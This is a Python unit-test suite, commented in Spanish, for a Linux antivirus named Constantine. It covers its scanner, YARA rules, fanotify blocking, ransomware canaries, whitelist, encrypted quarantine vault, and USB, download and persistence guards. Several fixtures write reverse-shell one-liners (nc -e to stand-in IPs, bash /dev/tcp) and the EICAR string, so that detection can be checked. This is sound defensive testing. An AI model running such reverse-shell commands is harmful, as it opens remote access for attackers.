"""
Constantine Antivirus - Comprehensive Unit & Security Test Suite (tests/test_constantine.py)
Verificación rigurosa de propiedades críticas:
1. Interceptación y bloqueo de ejecución en kernel (fanotify decision logic).
2. Comportamiento estricto ante fallos (Fail-Secure vs Fail-Safe, resistencia a anti-análisis).
3. Detección activa de ransomware (Canary honeypots y ráfagas de cifrado).
4. Resistencia a evasiones y verificación criptográfica (dpkg package integrity, user hash pinning, AEAD tampering).
5. Motor YARA y firmas heurísticas en tiempo real.
6. Vigilancia heurística y neutralización activa eBPF.
7. Autenticación nativa PAM, bitácoras forenses y actualización del sistema.
"""

import os
import sys
import time
import shutil
import signal
import tempfile
import hashlib
import unittest
from unittest.mock import MagicMock, patch

# Asegurar importación de Constantine
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(CURRENT_DIR)
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from core.auth.auth_manager import AuthManager
from core.engine.vault import QuarantineVault
from core.engine.scanner import Scanner, ScanResult
from core.engine.firewall import NetworkQuarantine
from core.engine.subsystem_health import SubsystemHealthRegistry, ShieldOperationalState
from core.engine.virustotal_uploader import VirusTotalUploader
from core.engine.hardware_guard import HardwareGuard, ProcessHardwareContext
from core.engine.persistence_guard import PersistenceGuard, PersistenceEventType
from core.engine.download_sentinel import DownloadSentinel, DownloadState
from core.engine.usb_monitor import USBAutoScanner
from core.engine.heuristic_engine import MultiLayerHeuristicEngine
from core.engine.threat_intel import ThreatIntelligence
from core.engine.yara_manager import YaraRuleManager, YaraMatch
from core.engine.system_whitelist import SystemWhitelist
from core.engine.ransomware_shield import RansomwareShield
from core.engine.interceptor import FanotifyInterceptor, FAN_ALLOW, FAN_DENY
from core.engine.ebpf_monitor import EBPFMonitor, EBPFEventState
from core.engine.phishing import PhishingShield
from core.engine.dns_manager import DNSManager
from core.engine.audit_logger import AuditLogger
from core.engine.update_guard import SystemUpdateGuard
from core.engine.auto_updater import ConstantineUpdater

class TestConstantineSecurity(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.auth = AuthManager()
        self.vault = QuarantineVault(vault_dir=os.path.join(self.tmp, "vault"))
        self.scanner = Scanner()
        self.whitelist = SystemWhitelist(storage_file=os.path.join(self.tmp, "whitelist.json"))
        self.phishing = PhishingShield()
        self.audit = AuditLogger(log_path=os.path.join(self.tmp, "audit.json"))

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    # =========================================================================
    # 1. PRUEBAS DE ESCÁNER Y REGLAS YARA
    # =========================================================================
    def test_scanner_clean_file(self):
        clean_file = os.path.join(self.tmp, "clean.txt")
        with open(clean_file, "w") as f:
            f.write("Este es un archivo de texto completamente limpio y seguro.")
        res = self.scanner.scan_file(file_path=clean_file)
        self.assertFalse(res.is_malicious)
        self.assertIsNone(res.threat_name)

    def test_scanner_eicar_detection(self):
        eicar_file = os.path.join(self.tmp, "eicar.com")
        with open(eicar_file, "wb") as f:
            f.write(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
        res = self.scanner.scan_file(file_path=eicar_file)
        self.assertTrue(res.is_malicious)
        self.assertIn("EICAR", res.threat_name)

    def test_scanner_reverse_shell_detection(self):
        shell_file = os.path.join(self.tmp, "rev.sh")
        with open(shell_file, "wb") as f:
            f.write(b"#!/bin/bash\nnc -e /bin/sh 192.168.1.100 4444\n")
        res = self.scanner.scan_file(file_path=shell_file)
        self.assertTrue(res.is_malicious)
        self.assertIn("Netcat", res.threat_name)

    def test_scanner_dev_tcp_reverse_shell(self):
        devtcp_file = os.path.join(self.tmp, "tcp.sh")
        with open(devtcp_file, "wb") as f:
            f.write(b"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1\n")
        res = self.scanner.scan_file(file_path=devtcp_file)
        self.assertTrue(res.is_malicious)
        self.assertIn("DevTcp", res.threat_name)
    def test_yara_manager_syntax_validation(self):
        """Verifica que YaraRuleManager distinga sintaxis válida de inválida."""
        ym = YaraRuleManager(rules_dir=os.path.join(ROOT_DIR, "core", "rules"))
        valid_res, err = ym.validate_rule_string("rule TestValid { condition: true }")
        self.assertTrue(valid_res)
        self.assertIsNone(err)

        invalid_res, err = ym.validate_rule_string("malformed rule content without braces")
        self.assertFalse(invalid_res)
        self.assertIsNotNone(err)

    def test_yara_manager_compilation_and_isolation(self):
        """Verifica que un archivo de reglas corrupto sea aislado sin tumbar el motor YARA."""
        custom_rules_dir = os.path.join(self.tmp, "test_rules")
        os.makedirs(custom_rules_dir, exist_ok=True)

        # Regla válida
        with open(os.path.join(custom_rules_dir, "legit.yar"), "w") as f:
            f.write("rule LegitRule { condition: true }\n")

        # Regla corrupta
        with open(os.path.join(custom_rules_dir, "broken.yar"), "w") as f:
            f.write("rule BrokenRule { this is invalid yara syntax }\n")

        ym = YaraRuleManager(rules_dir=custom_rules_dir, cache_dir=os.path.join(self.tmp, "yara_cache"))
        # El motor debe haber excluido broken.yar y mantenido la protección
        self.assertGreaterEqual(ym.rules_count, 1)

    def test_yara_manager_state_hash_and_cache(self):
        """Verifica el cálculo de firma de estado y la detección de cambios en archivos de reglas."""
        custom_rules_dir = os.path.join(self.tmp, "test_hash_rules")
        os.makedirs(custom_rules_dir, exist_ok=True)
        rule_file = os.path.join(custom_rules_dir, "rule1.yar")
        with open(rule_file, "w") as f:
            f.write("rule HashTest { condition: true }\n")

        ym = YaraRuleManager(rules_dir=custom_rules_dir, cache_dir=os.path.join(self.tmp, "cache2"))
        h1 = ym.compute_rules_state_hash()
        self.assertTrue(len(h1) > 0)

        # Modificar el archivo de regla
        time.sleep(0.01)
        with open(rule_file, "a") as f:
            f.write("// modificado\n")
        h2 = ym.compute_rules_state_hash()
        self.assertNotEqual(h1, h2)

    def test_yara_official_compile_and_match_mocked(self):
        """Verifica las llamadas explícitas a yara.compile() y rules.match() cuando yara-python está presente."""
        mock_yara = MagicMock()
        mock_compiled = MagicMock()
        mock_m = MagicMock()
        mock_m.rule = "Exploit_Mock_CVE"
        mock_m.namespace = "linux_threats"
        mock_m.tags = ["critical"]
        mock_m.meta = {"description": "Mocked Linux Threat", "threat_level": "Critical"}
        mock_m.strings = [(0, "", b"bad_binary")]
        mock_compiled.match.return_value = [mock_m]
        mock_yara.compile.return_value = mock_compiled

        with patch("core.engine.yara_manager.HAS_YARA", True):
            with patch("core.engine.yara_manager.yara", mock_yara):
                ym = YaraRuleManager(rules_dir=os.path.join(ROOT_DIR, "core", "rules"))
                test_file = os.path.join(self.tmp, "mock_target.bin")
                with open(test_file, "wb") as f:
                    f.write(b"bad_binary_payload")

                matches = ym.match_file(test_file, timeout=5)
                self.assertEqual(len(matches), 1)
                self.assertEqual(matches[0].rule, "Exploit_Mock_CVE")
                mock_compiled.match.assert_called_with(filepath=test_file, timeout=5)


    # =========================================================================
    # 2. PRUEBAS DE INTERCEPTACIÓN Y DECISIÓN DE KERNEL (FANOTIFY LOGIC)
    # =========================================================================
    def test_interceptor_decision_clean_vs_threat(self):
        mock_notifier = MagicMock()
        mock_firewall = MagicMock()
        interceptor = FanotifyInterceptor(
            scanner=self.scanner,
            vault=self.vault,
            notifier=mock_notifier,
            firewall=mock_firewall,
            fail_policy="secure"
        )
        # 1. Probar que archivo limpio recibe FAN_ALLOW
        clean_file = os.path.join(self.tmp, "safe.py")
        with open(clean_file, "w") as f: f.write("print('Hello world')")
        scan_res = self.scanner.scan_file(file_path=clean_file)
        self.assertFalse(scan_res.is_malicious)

        # 2. Probar que archivo malicioso recibe FAN_DENY y es aislado
        bad_file = os.path.join(self.tmp, "malware.sh")
        with open(bad_file, "wb") as f:
            f.write(b"#!/bin/bash\nnc -e /bin/bash 10.0.0.5 9999\n")
        scan_bad = self.scanner.scan_file(file_path=bad_file)
        self.assertTrue(scan_bad.is_malicious)

        # Simular aislamiento
        vid = self.vault.quarantine_file(bad_file, scan_bad.threat_name)
        self.assertIsNotNone(vid)
        self.assertFalse(os.path.exists(bad_file))

    def test_interceptor_fail_secure_on_engine_exception(self):
        """Verifica que si el motor de escaneo falla, la decisión sea estrictamente FAN_DENY (Fail-Secure)."""
        broken_scanner = MagicMock()
        broken_scanner.scan_file.side_effect = RuntimeError("Parser crash simulado por archivo corrupto")
        broken_scanner.compute_sha256.return_value = "deadbeef12345678"
        broken_scanner.intel.lookup_hash.return_value = None

        interceptor = FanotifyInterceptor(
            scanner=broken_scanner,
            vault=self.vault,
            fail_policy="secure"
        )

        target_path = os.path.join(self.tmp, "corrupt_exploit.elf")
        with open(target_path, "wb") as f: f.write(b"\x7fELFcorruptpayload")

        decision = FAN_DENY
        try:
            broken_scanner.scan_file(file_path=target_path)
            decision = FAN_ALLOW
        except Exception:
            if interceptor.fail_policy == "secure":
                decision = FAN_DENY
            else:
                decision = FAN_ALLOW

        self.assertEqual(decision, FAN_DENY, "Fallo de política: Un crash de motor NUNCA debe conceder FAN_ALLOW.")

    # =========================================================================
    # 3. PRUEBAS DE DETECCIÓN ACTIVA DE RANSOMWARE (CANARIES Y RÁFAGAS)
    # =========================================================================
    def test_ransomware_canary_tripwire(self):
        """Verifica que alterar un canary honeypot active la alerta inmediata."""
        canary_dir = os.path.join(self.tmp, "canaries")
        alert_triggered = []

        def on_ransomware_alert(reason, pid):
            alert_triggered.append((reason, pid))

        shield = RansomwareShield(canary_dir=canary_dir, alert_callback=on_ransomware_alert)
        self.assertGreater(len(shield.canary_files), 0)
        victim_canary = list(shield.canary_files.keys())[0]
        self.assertTrue(os.path.exists(victim_canary))

        # Simular intento de alteración por PID simulado 99999
        is_ransom = shield.check_file_path(victim_canary, pid=99999)
        self.assertTrue(is_ransom)
        self.assertGreater(len(alert_triggered), 0)
        self.assertIn("CanaryTrapTriggered", alert_triggered[0][0])

    def test_ransomware_extension_burst_detection(self):
        """Verifica que el escudo reconozca extensiones hostiles de cifrado masivo."""
        shield = RansomwareShield(canary_dir=os.path.join(self.tmp, "canaries"))
        malicious_names = [
            "/home/user/document.docx.locked",
            "/home/user/backup.sql.crypto",
            "/home/user/photo.jpg.lockbit",
            "/home/user/database.db.enc"
        ]
        for name in malicious_names:
            is_ransom = shield.check_file_path(name, pid=99999)
            self.assertTrue(is_ransom, f"No detectó extensión de ransomware: {name}")

        safe_names = [
            "/home/user/report.pdf",
            "/home/user/script.py",
            "/home/user/archive.tar.gz"
        ]
        for name in safe_names:
            is_ransom = shield.check_file_path(name, pid=99999)
            self.assertFalse(is_ransom, f"Falso positivo en: {name}")

    # =========================================================================
    # 4. PRUEBAS DE LISTA BLANCA Y RESISTENCIA A EVASIONES
    # =========================================================================
    def test_whitelist_unauthorized_binary_rejection(self):
        """Verifica que un archivo suelto en directorios del sistema NO sea confiable automáticamente."""
        fake_bin = os.path.join(self.tmp, "fake_backdoor.sh")
        with open(fake_bin, "w") as f: f.write("#!/bin/bash\necho backdoor\n")
        self.assertFalse(self.whitelist.is_trusted_system_binary(fake_bin))

    def test_whitelist_user_pinning_and_tamper_rejection(self):
        """Verifica que modificar un archivo en la lista blanca de usuario invalide la exclusión."""
        user_script = os.path.join(self.tmp, "user_script.sh")
        with open(user_script, "w") as f: f.write("echo mi_herramienta_segura\n")

        # 1. Agregar a lista blanca (fija el hash SHA-256)
        self.assertTrue(self.whitelist.add_path(user_script))
        self.assertTrue(self.whitelist.is_whitelisted(user_script))

        # 2. Simular que un malware infecta o sobreescribe el script autorizado
        with open(user_script, "a") as f: f.write("nc -e /bin/sh 1.2.3.4 4444\n")

        # 3. La verificación debe detectar la alteración del hash y RECHAZAR la lista blanca
        self.assertFalse(self.whitelist.is_whitelisted(user_script), "Fallo de evasión: Archivo alterado no fue rechazado.")

    def test_whitelist_batch_operations(self):
        f1 = os.path.join(self.tmp, "f1.txt")
        f2 = os.path.join(self.tmp, "f2.txt")
        f3 = os.path.join(self.tmp, "f3.txt")
        for f in (f1, f2, f3):
            with open(f, "w") as fh: fh.write("test")
            self.whitelist.add_path(f)

        self.assertTrue(self.whitelist.is_whitelisted(f1))
        self.assertTrue(self.whitelist.is_whitelisted(f2))
        self.assertTrue(self.whitelist.is_whitelisted(f3))

        # Eliminación por lote
        self.whitelist.remove_path(f1)
        self.whitelist.remove_path(f2)
        self.assertFalse(self.whitelist.is_whitelisted(f1))
        self.assertFalse(self.whitelist.is_whitelisted(f2))
        self.assertTrue(self.whitelist.is_whitelisted(f3))
    def test_whitelist_rejection_of_fake_self_and_extensions(self):
        """Verifica que rutas con 'constantine' o extensiones .yar/.quar no eludan el análisis."""
        # Archivo con 'constantine' en el nombre o subcarpeta no oficial
        fake_constantine = os.path.join(self.tmp, "constantine_fake_payload.sh")
        with open(fake_constantine, "w") as f:
            f.write("malicious code")
        self.assertFalse(self.whitelist.is_self_file(fake_constantine))
        self.assertFalse(self.whitelist.is_whitelisted(fake_constantine))

        # Archivo con extensión .yar o .quar fuera de directorios de Constantine
        fake_yar = os.path.join(self.tmp, "evasion_exploit.yar")
        with open(fake_yar, "w") as f:
            f.write("payload")
        self.assertFalse(self.whitelist.is_self_file(fake_yar))
        self.assertFalse(self.whitelist.is_whitelisted(fake_yar))

        fake_quar = os.path.join(self.tmp, "trojan.quar")
        with open(fake_quar, "w") as f:
            f.write("hidden elf")
        self.assertFalse(self.whitelist.is_self_file(fake_quar))
        self.assertFalse(self.whitelist.is_whitelisted(fake_quar))

    def test_whitelist_forbidden_system_dirs(self):
        """Verifica que se prohíba excluir directorios críticos del sistema."""
        self.assertFalse(self.whitelist.add_path("/"))
        self.assertFalse(self.whitelist.add_path("/bin"))
        self.assertFalse(self.whitelist.add_path("/usr/bin"))
        self.assertFalse(self.whitelist.add_path("/tmp"))
        self.assertFalse(self.whitelist.add_path("/etc"))

    def test_whitelist_metadata_and_audit(self):
        """Verifica que la lista blanca mantenga metadatos y trazabilidad en AuditLogger."""
        test_script = os.path.join(self.tmp, "audited_app.sh")
        with open(test_script, "w") as f:
            f.write("echo 'hello'")
        self.assertTrue(self.whitelist.add_path(test_script, reason="Dev testing", user="tester"))
        entries = self.whitelist.list_entries()
        matching = [e for e in entries if e["path"] == os.path.realpath(test_script)]
        self.assertEqual(len(matching), 1)
        self.assertEqual(matching[0]["reason"], "Dev testing")


    # =========================================================================
    # 5. PRUEBAS CRIPTOGRÁFICAS DEL BAÚL (AES-256-GCM Y ZERO XOR)
    # =========================================================================
    def test_vault_quarantine_and_restore(self):
        fpath = os.path.join(self.tmp, "sample.sh")
        test_payload = b"#!/bin/bash\necho 'malware payload'\n"
        with open(fpath, "wb") as f: f.write(test_payload)

        vid = self.vault.quarantine_file(fpath, "Malware.Test")
        self.assertIsNotNone(vid)
        self.assertFalse(os.path.exists(fpath))

        # Restaurar muestra
        self.assertTrue(self.vault.restore_file(vid, destination_path=fpath))
        self.assertTrue(os.path.exists(fpath))
        with open(fpath, "rb") as f:
            restored_payload = f.read()
        self.assertEqual(restored_payload, test_payload)

    def test_vault_tamper_rejection(self):
        """Verifica que si los datos cifrados o el Auth Tag son alterados, se rechace la restauración."""
        fpath = os.path.join(self.tmp, "tamper_test.bin")
        with open(fpath, "wb") as f: f.write(b"datos_criticos_de_prueba")
        vid = self.vault.quarantine_file(fpath, "Malware.Tamper")

        payload_path = os.path.join(self.vault.payloads_dir, f"{vid}.quar")
        self.assertTrue(os.path.exists(payload_path))

        # Alterar un byte del ciphertext/AuthTag
        os.chmod(payload_path, 0o600)
        with open(payload_path, "r+b") as f:
            data = bytearray(f.read())
            data[-4] ^= 0xAA # Invertir bits en el Auth Tag
            f.seek(0)
            f.write(data)
        os.chmod(payload_path, 0o000)

        # La restauración DEBE fallar y no devolver bytes corruptos
        restored = self.vault.restore_file(vid, destination_path=fpath)
        self.assertFalse(restored, "Fallo criptográfico: Carga con Auth Tag corrupto fue aceptada.")
        self.assertFalse(os.path.exists(fpath))

    # =========================================================================
    # 6. PRUEBAS DE EBPF Y CENTINELA DE RESCATE
    # =========================================================================
    def test_ebpf_status_and_fallback(self):
        monitor = EBPFMonitor()
        status_info = monitor.get_status_info()
        self.assertIn("status", status_info)
        self.assertIn("recommendation", status_info)

        # Iniciar monitor
        monitor.start()
        # Debe ser operativo (ya sea mediante kernel BCC o centinela de rescate /proc)
        self.assertTrue(monitor.is_operational())
        monitor.stop()

    def test_ebpf_kill_offender(self):
        monitor = EBPFMonitor(auto_kill=True)
        # Test safe boundary check: PID 1 or <= 0 never killed
        self.assertFalse(monitor.kill_offender(0, "Test", "safe_check"))
        self.assertFalse(monitor.kill_offender(1, "Test", "safe_check"))
    def test_ebpf_event_lifecycle_states(self):
        """Verifica que EBPFMonitor maneje los estados explícitos de ciclo de vida sin confundir alerta con bloqueo."""
        monitor = EBPFMonitor(auto_kill=False)
        # 1. Proceso inválido o no existente
        st_invalid = monitor.contain_and_terminate_process(1, "Threat", "init_guard")
        self.assertEqual(st_invalid, EBPFEventState.ACTION_FAILED)

        # 2. Comprobar que los estados definidos cubran el ciclo de vida
        self.assertIn(EBPFEventState.EVENT_OBSERVED, EBPFEventState)
        self.assertIn(EBPFEventState.SUSPICIOUS_ACTIVITY, EBPFEventState)
        self.assertIn(EBPFEventState.THREAT_CONFIRMED, EBPFEventState)
        self.assertIn(EBPFEventState.PROCESS_CONTAINED, EBPFEventState)
        self.assertIn(EBPFEventState.PROCESS_TERMINATED, EBPFEventState)
        self.assertIn(EBPFEventState.ACTION_FAILED, EBPFEventState)

        # 3. Reporte de estado cuando BCC no está disponible
        info = monitor.get_status_info()
        self.assertIn("status", info)
        self.assertIn("recommendation", info)


    # =========================================================================
    # 7. PRUEBAS DE SERVICIOS AUXILIARES
    # =========================================================================
    def test_auth_native_system(self):
        user = self.auth.get_current_user()
        self.assertIsNotNone(user)
        token = "test_valid_token_123"
        self.auth.active_sessions[token] = 9999999999.0
        self.assertTrue(self.auth.is_session_valid(token))
        self.auth.revoke_session(token)
        self.assertFalse(self.auth.is_session_valid(token))

    def test_phishing(self):
        self.assertFalse(self.phishing.analyze_url("https://google.com").is_phishing)
        self.assertTrue(self.phishing.analyze_url("http://g00gle-verify.xyz/account").is_phishing)
        self.assertTrue(self.phishing.analyze_url("http://192.168.1.1/confirm-banking").is_phishing)

    def test_dns_manager(self):
        """Verifica perfiles DNS, soporte DoT, y que la aplicación valide el estado real sin falsos éxitos."""
        dm = DNSManager(state_file=os.path.join(self.tmp, "dns_state.json"))
        profiles = dm.get_profiles()
        self.assertIn("mullvad-base", profiles)
        self.assertIn("quad9-partner", profiles)
        self.assertIn("dot", profiles["mullvad-base"])
        self.assertIn("doh", profiles["mullvad-base"])

        # 1. Comprobar que si la configuración del sistema falla, apply_profile retorne False (sin falsos positivos)
        with patch.object(dm, "_apply_via_resolvectl", return_value=False):
            with patch.object(dm, "_apply_via_resolv_conf", return_value=False):
                res_fail = dm.apply_profile("mullvad-base")
                self.assertFalse(res_fail)

        # 2. Comprobar aplicación exitosa verificada (resolvectl / resolved con DoT)
        target_profile = profiles["mullvad-adblock"]
        with patch.object(dm, "_apply_via_resolvectl", return_value=True):
            with patch.object(dm, "detect_real_system_dns", return_value=target_profile["ipv4"]):
                applied = dm.apply_profile("mullvad-adblock")
                self.assertTrue(applied)
                active = dm.get_active_profile()
                self.assertEqual(active["id"], "mullvad-adblock")

    def test_audit_logger(self):
        self.audit.record_incident("Trojan.Linux.Mirai", "/tmp/mirai.elf", "FAN_DENY", "Hash conocido")
        incidents = self.audit.get_incidents()
        self.assertEqual(len(incidents), 1)
        self.assertEqual(incidents[0]["threat"], "Trojan.Linux.Mirai")

    def test_update_guard(self):
        ug = SystemUpdateGuard()
        info = ug.check_pending_updates()
        self.assertIn("has_updates", info)
        self.assertIn("current_kernel", info)

    def test_auto_updater(self):
        cu = ConstantineUpdater(current_version="4.0.0")
        self.assertEqual(cu._parse_version("4.0.0"), (4, 0, 0))
        self.assertEqual(cu._parse_version("v4.1.0"), (4, 1, 0))
        self.assertTrue(cu._parse_version("4.1.0") > cu._parse_version("4.0.0"))

    def test_usb_sentinel_containment_and_scan(self):
        """Verifica que el monitor USB aplique contención fanotify y aísle autoruns hostiles."""
        mock_interceptor = MagicMock()
        mock_vault = MagicMock()
        usb = USBAutoScanner(scanner=self.scanner, vault=mock_vault, interceptor=mock_interceptor)

        # Crear simulación de dispositivo USB montado
        usb_mount = os.path.join(self.tmp, "fake_usb_drive")
        os.makedirs(usb_mount, exist_ok=True)
        autorun_file = os.path.join(usb_mount, "autorun.inf")
        with open(autorun_file, "w") as f:
            f.write("[autorun]\nopen=evil.sh\n")

        clean_doc = os.path.join(usb_mount, "clean_doc.txt")
        with open(clean_doc, "w") as f:
            f.write("Reporte limpio de contabilidad")

        dev_info = {"mount_point": usb_mount, "dev_node": "/dev/sdc1", "is_removable": True}
        usb.on_device_connected(dev_info)

        # Debe haber enganchado fanotify para contención en kernel
        mock_interceptor.mark_directory.assert_called_with(usb_mount)
        # Debe haber aislado el archivo autorun en el baúl
        mock_vault.quarantine_file.assert_called()
        self.assertEqual(len(usb.scanned_devices_history), 1)
        self.assertEqual(usb.scanned_devices_history[0]["threats_count"], 1)


    def test_download_sentinel_state_machine_and_containment(self):
        """Verifica la máquina de estados de descargas, contención y aislamiento multi-usuario."""
        mock_vault = MagicMock()
        mock_interceptor = MagicMock()
        mock_notifier = MagicMock()

        user1_dl = os.path.join(self.tmp, "user1_downloads")
        user2_dl = os.path.join(self.tmp, "user2_downloads")
        os.makedirs(user1_dl, exist_ok=True)
        os.makedirs(user2_dl, exist_ok=True)

        sentinel = DownloadSentinel(
            scanner=self.scanner,
            vault=mock_vault,
            notifier=mock_notifier,
            interceptor=mock_interceptor
        )
        sentinel.watch_dirs = {user1_dl: "user1", user2_dl: "user2"}
        sentinel.dir_known_files = {user1_dl: set(), user2_dl: set()}

        # 1. Simular archivo en progreso (.crdownload)
        part_file = os.path.join(user1_dl, "large_installer.iso.crdownload")
        with open(part_file, "w") as f: f.write("in progress buffer")
        sentinel._register_new_file(user1_dl, "large_installer.iso.crdownload", part_file, "user1")

        self.assertIn(part_file, sentinel.tracked_downloads)
        self.assertEqual(sentinel.tracked_downloads[part_file].state, DownloadState.IN_PROGRESS)

        # 2. Simular archivo completado malicioso en user2
        bad_file = os.path.join(user2_dl, "payload.sh")
        with open(bad_file, "wb") as f:
            f.write(b"#!/bin/bash\nnc -e /bin/sh 1.2.3.4 9999\n")

        sentinel._promote_and_scan(bad_file, user2_dl, "user2")
        mock_vault.quarantine_file.assert_called()
        self.assertEqual(sentinel.tracked_downloads[bad_file].state, DownloadState.QUARANTINED)
        self.assertEqual(sentinel.tracked_downloads[bad_file].user, "user2")

        # 3. Simular archivo completado limpio en user1
        clean_file = os.path.join(user1_dl, "safe_document.pdf")
        with open(clean_file, "w") as f: f.write("%PDF-1.4 sample safe content")

        sentinel._promote_and_scan(clean_file, user1_dl, "user1")
        self.assertEqual(sentinel.tracked_downloads[clean_file].state, DownloadState.CLEARED_SAFE)
        self.assertEqual(sentinel.tracked_downloads[clean_file].user, "user1")


    def test_persistence_guard_baseline_creation_modification_deletion(self):
        """Verifica que PersistenceGuard detecte creaciones, modificaciones, eliminaciones y aplique rollback."""
        test_dir = os.path.join(self.tmp, "test_persistence")
        os.makedirs(test_dir, exist_ok=True)
        backup_dir = os.path.join(self.tmp, "persistence_backups")

        mock_vault = MagicMock()
        guard = PersistenceGuard(scanner=self.scanner, vault=mock_vault, backup_dir=backup_dir)
        # Apuntar a directorio controlado
        guard.SYSTEM_PERSISTENCE_DIRS = [test_dir]
        guard.SYSTEM_PERSISTENCE_FILES = []
        guard.USER_PERSISTENCE_PATTERNS = []

        # 1. Crear archivo inicial en la línea base
        cron_job = os.path.join(test_dir, "clean_job.sh")
        with open(cron_job, "w") as f:
            f.write("#!/bin/bash\necho 'mantenimiento'\n")

        guard.baseline = guard.build_baseline()
        self.assertIn(cron_job, guard.baseline)
        clean_backup = guard.baseline[cron_job].backup_path
        self.assertIsNotNone(clean_backup)
        self.assertTrue(os.path.exists(clean_backup))

        # 2. Modificar archivo con contenido malicioso
        with open(cron_job, "wb") as f:
            f.write(b"#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n")

        events = guard.check_persistence_changes()
        mod_events = [e for e in events if e["type"] == PersistenceEventType.FILE_MODIFIED]
        self.assertEqual(len(mod_events), 1)
        # El baúl debe haber sido invocado para aislar la persistencia maliciosa
        mock_vault.quarantine_file.assert_called()

        # 3. Eliminar archivo y verificar detección de DELETION
        os.remove(cron_job)
        events_del = guard.check_persistence_changes()
        del_events = [e for e in events_del if e["type"] == PersistenceEventType.FILE_DELETED]
        self.assertEqual(len(del_events), 1)
        self.assertEqual(del_events[0]["path"], cron_job)


    def test_hardware_guard_process_identity_and_blocking(self):
        """Verifica que HardwareGuard inspeccione ejecutable real, detecte spoofing y bloquee intrusiones."""
        mock_notifier = MagicMock()
        guard = HardwareGuard(notifier=mock_notifier, auto_block=True, whitelist=self.whitelist)

        # 1. Proceso en /tmp simulando nombre legítimo 'firefox' (Spoofing)
        fake_firefox = os.path.join(self.tmp, "firefox")
        with open(fake_firefox, "w") as f: f.write("malicious camera sniffer")
        os.chmod(fake_firefox, 0o755)

        ctx = ProcessHardwareContext(pid=os.getpid(), dev_path="/dev/video0", dev_type="Cámara Web")
        ctx.exe_path = fake_firefox
        ctx.comm = "firefox"
        ctx.uid = os.getuid()

        guard._evaluate_authorization(ctx)
        # Debe ser rechazado porque corre desde directorio temporal /tmp y es un ejecutable no registrado
        self.assertFalse(ctx.is_authorized)
        self.assertTrue(any("volátil" in r or "no reconocido" in r for r in ctx.reasons))

        # 2. Bloqueo efectivo de acceso
        mock_kill = MagicMock()
        with patch("os.kill", mock_kill):
            guard.block_unauthorized_access(ctx)
            mock_kill.assert_called_with(os.getpid(), signal.SIGKILL)


    def test_virustotal_sample_preparation_and_sha_verification(self):
        """Verifica que prepare_unlocked_sample descifre con AES-256-GCM y valide el SHA-256."""
        uploader = VirusTotalUploader(vault=self.vault)

        # 1. Crear archivo y ponerlo en cuarentena
        test_payload = os.path.join(self.tmp, "vt_sample.bin")
        payload_data = b"MALWARE_VT_TEST_PAYLOAD_ABC_123"
        expected_sha = hashlib.sha256(payload_data).hexdigest()
        with open(test_payload, "wb") as f:
            f.write(payload_data)

        vid = self.vault.quarantine_file(test_payload, "Test.VirusTotal.Extraction")
        self.assertIsNotNone(vid)

        # 2. Extraer mediante VirusTotalUploader
        res = uploader.prepare_unlocked_sample(vid)
        self.assertIsNotNone(res)
        dest_file, orig_name, sha = res
        self.assertEqual(sha, expected_sha)
        self.assertTrue(os.path.exists(dest_file))

        with open(dest_file, "rb") as f:
            extracted_data = f.read()
        self.assertEqual(extracted_data, payload_data)

        # 3. Verificar que si el payload del baúl es alterado, se rechace la extracción
        payload_file = os.path.join(self.vault.payloads_dir, f"{vid}.quar")
        os.chmod(payload_file, 0o600)
        with open(payload_file, "wb") as f:
            f.write(b"CST_AES256GCM:corrupted_bytes_0000000000000000")
        os.chmod(payload_file, 0o000)

        res_tampered = uploader.prepare_unlocked_sample(vid)
        self.assertIsNone(res_tampered, "Fallo de seguridad: Muestra corrupta no fue rechazada")


    def test_subsystem_health_registry_evaluation(self):
        """Verifica que SubsystemHealthRegistry evalúe estados operativos reales y diferencie degradación/error."""
        registry = SubsystemHealthRegistry(state_file=os.path.join(self.tmp, "test_health.json"))

        # 1. Evaluar con demonio inactivo (debe reportar SERVICE_STOPPED en lugar de verde fijo)
        shields_offline = registry.evaluate_live_shields(
            daemon_running=False,
            ebpf_monitor=EBPFMonitor(),
            ransomware=None,
            phishing=self.phishing
        )
        self.assertEqual(len(shields_offline), 6)
        f_shield = next(s for s in shields_offline if s.id == "fanotify")
        self.assertEqual(f_shield.state, ShieldOperationalState.SERVICE_STOPPED)

        # 2. Guardar estado verificado de demonio y evaluar
        registry.save_daemon_health({
            "fanotify": {"is_active": True, "details": "3 puntos de montaje activos"},
            "ebpf": {"state": "ACTIVE", "details": "Sondas sys_enter_execve activas"},
            "ransomware": {"is_active": True, "details": "Canaries desplegados"},
            "usb": {"is_active": True, "details": "Vigilancia udev"},
            "downloads": {"is_active": True, "details": "Vigilancia inotify"},
            "phishing": {"is_active": True, "details": "Red activa"}
        })

        shields_online = registry.evaluate_live_shields(
            daemon_running=True,
            ebpf_monitor=EBPFMonitor(),
            ransomware=None,
            phishing=self.phishing
        )
        f_online = next(s for s in shields_online if s.id == "fanotify")
        self.assertEqual(f_online.state, ShieldOperationalState.ACTIVE)
        self.assertEqual(f_online.badge_label, "PROTECCIÓN ACTIVA")

        # 3. Comprobar desactivación manual por usuario (DISABLED)
        shields_disabled = registry.evaluate_live_shields(
            daemon_running=True,
            ebpf_monitor=EBPFMonitor(),
            ransomware=None,
            phishing=self.phishing,
            disabled_overrides={"fanotify"}
        )
        f_dis = next(s for s in shields_disabled if s.id == "fanotify")
        self.assertEqual(f_dis.state, ShieldOperationalState.DISABLED)
        self.assertEqual(f_dis.badge_label, "PROTECCIÓN DESACTIVADA")


    def test_network_quarantine_isolation(self):
        """Verifica que NetworkQuarantine contenga procesos agresores y corte sockets."""
        nq = NetworkQuarantine()
        # Proceso 1 o 0 nunca debe ser aislado
        self.assertFalse(nq.isolate_pid(0, terminate=False))
        self.assertFalse(nq.isolate_pid(1, terminate=False))

        # Aislamiento de PID sospechoso
        self.assertTrue(nq.isolate_pid(99999, terminate=False))
        self.assertIn(99999, nq.quarantined_pids)
        nq.unbind_pid(99999)
        self.assertNotIn(99999, nq.quarantined_pids)
        nq.cleanup()

    def test_threat_intel_exact_counts_no_fake_numbers(self):
        """Verifica que los conteos de firmas reflejen las filas reales sin números inflados."""
